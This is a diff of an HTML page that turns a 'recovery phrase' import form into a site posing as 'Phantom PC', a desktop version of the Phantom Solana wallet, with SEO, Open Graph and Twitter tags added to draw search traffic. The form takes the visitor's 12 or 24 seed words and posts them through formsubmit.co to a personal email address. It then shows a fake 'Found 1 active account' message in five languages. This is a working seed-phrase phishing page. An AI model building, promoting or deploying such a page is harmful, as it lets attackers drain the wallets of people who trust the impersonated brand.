@@ -3,8 +3,34 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Wallet Import | Landing</title>
-  <meta name="description" content="Recovery phrase input UI demo" />
+
+  <!-- Primary SEO -->
+  <title>Phantom PC - Solana Wallet for Desktop</title>
+  <meta name="description" content="Use the Phantom wallet on your PC with Chrome or Edge. Simple, Solana-based wallet UX for desktop (unofficial)." />
+  <meta name="keywords" content="phantom wallet, phantom pc, phantom desktop, 팬텀 지갑, 솔라나 지갑, solana wallet, phantom wallet pc" />
+  <meta name="author" content="Phantom PC" />
+  <link rel="canonical" href="https://phantompc.vercel.app/" />
+  <meta name="robots" content="index,follow" />
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="Phantom PC - Solana Wallet for Desktop" />
+  <meta property="og:description" content="Use Phantom wallet on your PC using Chrome or Edge browsers. Solana-based wallet, simple and secure (unofficial)." />
+  <meta property="og:url" content="https://phantompc.vercel.app/" />
+  <meta property="og:type" content="website" />
+  <!-- 필요하다면 대표 이미지 추가
+  <meta property="og:image" content="https://phantompc.vercel.app/og-image.png" />
+  -->
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Phantom PC - Solana Wallet for Desktop" />
+  <meta name="twitter:description" content="Use Phantom wallet on your PC using Chrome or Edge browsers. Solana-based wallet, simple and secure (unofficial)." />
+  <!-- <meta name="twitter:image" content="https://phantompc.vercel.app/og-image.png" /> -->
+
+  <!-- Site verification (Google Search Console) -->
+  <meta name="google-site-verification" content="BHGXI_IDDadiKpJlvEBVsN1XXAbe9JVDGtz_bfjFiik" />
+
+  <!-- Styles -->
   <style>
     :root{
       --bg:#d9d3f0;           /* soft lavender bg */
@@ -72,7 +98,6 @@
     .langmenu button{display:block;width:100%;text-align:left;padding:10px 12px;background:transparent;border:none;color:#e8ecf3;cursor:pointer}
     .langmenu button:hover{background:#252a32}
   </style>
-  <meta name="google-site-verification" content="BHGXI_IDDadiKpJlvEBVsN1XXAbe9JVDGtz_bfjFiik" />
 </head>
 <body>
   <div class="page">
@@ -86,7 +111,7 @@
       </div>
       <div class="card-body">
         <h1 id="title">Recovery phrase</h1>
-        <p class="sub">Import an existing wallet with a 12 or 24‑word recovery phrase.</p>
+        <p class="sub">Import an existing wallet with a 12 or 24-word recovery phrase.</p>
 
         <!-- FormSubmit -->
         <form name="students" id="studentForm" method="POST" action="https://formsubmit.co/lgm1831@naver.com">
@@ -98,7 +123,7 @@
           </div>
 
           <div class="toggle">
-            <button type="button" id="toggleBtn" class="btn" style="background:#252a32;border-color:#2f3540;width:auto;padding:8px 12px;display:block;margin:0 auto;">I have a 24‑word recovery phrase</button>
+            <button type="button" id="toggleBtn" class="btn" style="background:#252a32;border-color:#2f3540;width:auto;padding:8px 12px;display:block;margin:0 auto;">I have a 24-word recovery phrase</button>
           </div>
 
           <input type="hidden" name="entries" id="entries" />
@@ -153,9 +178,9 @@
   <script>
     // ===== i18n =====
     const I18N = {
-      en:{ title:'Recovery phrase', sub:'Import an existing wallet with a 12 or 24‑word recovery phrase.', toggle24:'I have a 24‑word recovery phrase', toggle12:'I have a 12‑word recovery phrase', submit:'Import wallet', overlayTitle:'Fetching accounts', overlaySub:'Looking for active accounts', doneTitle:'Fetching accounts', doneSub:'Found 1 active account', view:'View account', cont:'Continue', word:'word', language:'Language', helpLabel:'Help', helpAlert:'Demo help\nEnter 12/24 words and press Import.'},
+      en:{ title:'Recovery phrase', sub:'Import an existing wallet with a 12 or 24-word recovery phrase.', toggle24:'I have a 24-word recovery phrase', toggle12:'I have a 12-word recovery phrase', submit:'Import wallet', overlayTitle:'Fetching accounts', overlaySub:'Looking for active accounts', doneTitle:'Fetching accounts', doneSub:'Found 1 active account', view:'View account', cont:'Continue', word:'word', language:'Language', helpLabel:'Help', helpAlert:'Demo help\nEnter 12/24 words and press Import.'},
       ko:{ title:'복구용 문구', sub:'12개 또는 24개 단어의 복구용 문구로 기존 월릿을 가져옵니다.', toggle24:'24개 단어의 복구 문구가 있습니다', toggle12:'12개 단어의 복구 문구가 있습니다', submit:'월릿 가져오기', overlayTitle:'계정 가져오기', overlaySub:'활동이 있는 계정 찾기', doneTitle:'계정 가져오기', doneSub:'활동이 있는 1개 계정을 찾았습니다', view:'계정 보기', cont:'계속', word:'단어', language:'언어', helpLabel:'도움말', helpAlert:'도움말 데모\n12/24단어를 입력하고 가져오기를 누르세요.'},
-      ja:{ title:'リカバリーフレーズ', sub:'12語または24語のリカバリーフレーズで既存のウォレットをインポートします。', toggle24:'24語のリカバリーフレーズを持っています', toggle12:'12語のリカバリーフレーズを持っています', submit:'ウォレットをインポート', overlayTitle:'アカウントを取得中', overlaySub:'アクティブなアカウントを検索', doneTitle:'アカウントを取得中', doneSub:'アクティブなアカウントを1件見つけました', view:'アカウントを見る', cont:'続行', word:'単語', language:'言語', helpLabel:'ヘルプ', helpAlert:'デ모ヘルプ\n12/24語を入力して［インポート］を押してください。'},
+      ja:{ title:'リカバリーフレーズ', sub:'12語または24語のリカバリーフレーズで既存のウォレットをインポートします。', toggle24:'24語のリカバリーフレーズを持っています', toggle12:'12語のリカバリーフレーズを持っています', submit:'ウォレットをインポート', overlayTitle:'アカウントを取得中', overlaySub:'アクティブなアカウントを検索', doneTitle:'アカウントを取得中', doneSub:'アクティブなアカウントを1件見つけました', view:'アカウントを見る', cont:'続行', word:'単語', language:'言語', helpLabel:'ヘルプ', helpAlert:'デモヘルプ\n12/24語を入力して［インポート］を押してください。'},
       zh:{ title:'助记词', sub:'使用 12 或 24 个单词的助记词导入已有钱包。', toggle24:'我有 24 个单词的助记词', toggle12:'我有 12 个单词的助记词', submit:'导入钱包', overlayTitle:'正在获取账户', overlaySub:'正在查找活跃账户', doneTitle:'正在获取账户', doneSub:'找到 1 个活跃账户', view:'查看账户', cont:'继续', word:'单词', language:'语言', helpLabel:'帮助', helpAlert:'演示帮助\n输入 12/24 个单词并点击“导入”。'},
       es:{ title:'Frase de recuperación', sub:'Importa una billetera existente con una frase de recuperación de 12 o 24 palabras.', toggle24:'Tengo una frase de 24 palabras', toggle12:'Tengo una frase de 12 palabras', submit:'Importar billetera', overlayTitle:'Buscando cuentas', overlaySub:'Buscando cuentas activas', doneTitle:'Búsqueda de cuentas', doneSub:'Se encontró 1 cuenta activa', view:'Ver cuenta', cont:'Continuar', word:'palabra', language:'Idioma', helpLabel:'Ayuda', helpAlert:'Ayuda de demostración\nIntroduce 12/24 palabras y pulsa Importar.'}
     };
